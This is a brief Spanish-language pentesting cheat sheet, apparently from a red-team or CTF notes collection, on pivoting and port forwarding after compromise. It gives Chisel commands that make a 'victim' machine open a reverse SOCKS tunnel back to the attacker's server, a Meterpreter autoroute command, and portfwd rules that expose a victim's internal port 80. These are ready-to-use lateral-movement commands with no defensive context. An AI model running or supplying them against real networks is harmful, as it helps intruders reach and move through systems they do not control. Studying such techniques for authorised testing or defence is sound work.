# 🥷🏿Pivoting con Chisel & Metasploit

#### Chisel

<pre>
  <code>
    # Servidor (Atacante)
    
./chisel server -p (puerto) --reverse --socks

# Cliente (Máquina víctima)
    
./chisel client (ip):(puerto) R:socks

  </code>
</pre>

## Metasploit

<pre>
  <code>
run autoroute -s (IP)/20
  </code>
</pre>

# 🥷🏿PortForwarding cin Chisel & Metasploit

#### Chisel

<pre>
  <code>
# Servidor (Atacante)
./chisel server -p 1337 --reverse 

# Cliente (Máquina víctima)
./chisel client 10.0.2.14:1337 R:4444:(IP):80
   
# Argumento
4444 = Nuestro puerto 9000
(IP):80 = Victima IP y puerto
    </code>
</pre>

#### Metasploit 

<pre>
  <code>
# Añadir port forwarding
portfwd add -l 1234 -p 80 -r (IP)

# Lista
portfwd list
</code>
</pre>
